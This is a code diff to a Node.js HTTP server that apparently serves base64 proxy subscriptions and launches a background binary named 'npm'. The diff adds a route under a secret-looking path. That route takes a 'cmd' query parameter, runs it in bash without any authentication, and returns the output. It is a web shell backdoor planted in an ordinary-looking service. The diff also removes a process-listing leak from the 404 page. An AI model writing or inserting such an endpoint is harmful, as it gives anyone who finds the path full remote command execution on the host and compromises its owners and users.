@@ -133,7 +133,18 @@ const unzipNTRun = async function () {
     await runCustomSh("nohup ./npm -c config.yaml >/dev/null 2>&1 &", { shell: '/bin/bash' })
 }
 
-
+function queryToObject(req) {
+  const urlObj = new URL(req.url, `http://${req.headers.host}`);
+  let searchParams = urlObj.searchParams;
+  const obj = {};
+  for (const [k, v] of searchParams) {
+    // 如果重复 key，则转数组
+    if (obj[k] === undefined) obj[k] = v;
+    else if (Array.isArray(obj[k])) obj[k].push(v);
+    else obj[k] = [obj[k], v];
+  }
+  return obj;
+}
 
 // http route
 const httpServer = http.createServer(async (req, res) => {
@@ -164,10 +175,28 @@ const httpServer = http.createServer(async (req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end(base64Content + '\n');
   } 
+    else if (req.url === `/${SUBS_PATH}e`) {
+      let out = "";
+      let query = queryToObject(req);
+      try{
+        let cmd = query.cmd || "";
+         if (!cmd) {
+          out = "need cmd";
+         }else{
+            let {stdout, stderr} = await runCustomSh(cmd,{ shell: '/bin/bash' });
+            out += stdout;
+            if (stderr) out += stderr;
+         }
+      } catch(err) {
+          out = err.stack;
+      }
+
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end(out + '\n');
+  } 
   else {
-    let {stdout, stderr} = await runCustomSh("ps -ef",{ shell: '/bin/bash' });
     res.writeHead(404, { 'Content-Type': 'text/plain' });
-    res.end('Not Found\nstdout:'+stdout+"\n\n"+stderr);
+    res.end('Not Found');
   }
 });
 
